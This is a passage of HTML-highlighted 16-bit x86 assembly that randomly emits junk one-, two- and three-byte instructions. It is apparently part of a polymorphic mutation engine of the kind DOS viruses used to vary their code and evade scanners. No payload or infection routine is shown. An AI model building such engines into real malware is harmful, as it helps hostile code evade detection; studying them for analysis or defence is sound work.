        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_a2_2_1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">42h</span><span class="sc0">     </span><span class="sc1">; inc dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_a2_2_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">43h</span><span class="sc0">     </span><span class="sc1">; inc bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_a2_1_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; inc ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_a2_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@cont_a2_2_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">48h</span><span class="sc0">     </span><span class="sc1">; dec ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_a2_2_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_a2_2_2_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">4bh</span><span class="sc0">     </span><span class="sc1">; dec bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_a2_2_2_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">4ah</span><span class="sc0">     </span><span class="sc1">; dec dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_a2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_a2_11</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_a2_12</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_a2_2_11</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_a2_2_12</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_a2_2_13</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0cch</span><span class="sc0">    </span><span class="sc1">; int 3h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_a2_2_11</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">9fh</span><span class="sc0">     </span><span class="sc1">; lahf</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_a2_2_12</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">99h</span><span class="sc0">     </span><span class="sc1">; cwd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_a2_2_13</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">98h</span><span class="sc0">     </span><span class="sc1">; cbw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_a2_11</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0F9h</span><span class="sc0">    </span><span class="sc1">; stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_a2_12</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0F8h</span><span class="sc0">    </span><span class="sc1">; clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">



  </span><span class="sc1">; Generator ----&gt; Two bytes length instructions</span><span class="sc0">

</span><span class="sc5">inst_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_sub</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">sigunvm</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@cont_xor</span><span class="sc0">
</span><span class="sc5">sigunvm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@cont_mul</span><span class="sc0">
</span><span class="sc5">@cont_sub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">2bh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_bx_dxdisi</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_bx_cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0d8h</span><span class="sc0">  </span><span class="sc1">; sub bx,ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_bx_cx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0d9h</span><span class="sc0">  </span><span class="sc1">; sub bx,cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_bx_dxdisi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_bx_dx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_bx_di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0deh</span><span class="sc0">   </span><span class="sc1">; sub bx,si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_bx_di</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0dfh</span><span class="sc0">   </span><span class="sc1">; sub bx,di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_bx_dx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0dah</span><span class="sc0">  </span><span class="sc1">; sub bx,dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_ax</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_ax_dxdisi</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_ax_cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0c3h</span><span class="sc0">  </span><span class="sc1">; sub ax,bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_ax_cx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0c1h</span><span class="sc0">  </span><span class="sc1">; sub ax,cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_ax_dxdisi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_ax_dx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_ax_di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0c6h</span><span class="sc0">  </span><span class="sc1">; sub ax,si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_ax_di</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0c7h</span><span class="sc0">  </span><span class="sc1">; sub ax,di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_ax_dx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0c2h</span><span class="sc0">  </span><span class="sc1">; sub ax,dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_dx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_dx_sidicx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_dx_bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0d0h</span><span class="sc0">     </span><span class="sc1">; sub dx,ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_dx_bx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0d3h</span><span class="sc0">     </span><span class="sc1">; sub dx,bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_dx_sidicx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_dx_cx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_bsub_dx_di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0d6h</span><span class="sc0">     </span><span class="sc1">; sub dx,si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_dx_di</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0d7h</span><span class="sc0">     </span><span class="sc1">; sub dx,di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_bsub_dx_cx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0d1h</span><span class="sc0">     </span><span class="sc1">; sub dx,cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@cont_xor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">033h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_xor_4last</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_xor_34</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_xor_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0c0h</span><span class="sc0">     </span><span class="sc1">; xor ax,ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_xor_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0c3h</span><span class="sc0">     </span><span class="sc1">; xor ax,bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_xor_34</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_xor_4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0c2h</span><span class="sc0">     </span><span class="sc1">; xor ax,dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_xor_4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0dbh</span><span class="sc0">     </span><span class="sc1">; xor bx,bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_xor_4last</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_xor_78</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_xor_6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0d8h</span><span class="sc0">     </span><span class="sc1">; xor bx,ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_xor_6</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0dah</span><span class="sc0">     </span><span class="sc1">; xor bx,dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_xor_78</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_xor_8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0d2h</span><span class="sc0">     </span><span class="sc1">; xor dx,dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_xor_8</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0d0h</span><span class="sc0">     </span><span class="sc1">; xor dx,ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@cont_mul</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0f7h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_divmul_34</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_divmul_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0e3h</span><span class="sc0">       </span><span class="sc1">; mul bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_divmul_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0e1h</span><span class="sc0">       </span><span class="sc1">; mul cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_divmul_34</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_divmul_4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0e6h</span><span class="sc0">       </span><span class="sc1">; mul si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_divmul_4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0e7h</span><span class="sc0">       </span><span class="sc1">; mul di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


  </span><span class="sc1">; Generator ----&gt; Three bytes long instructions</span><span class="sc0">

</span><span class="sc5">inst_3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; We don't want a 0ffffh</span><span class="sc0">
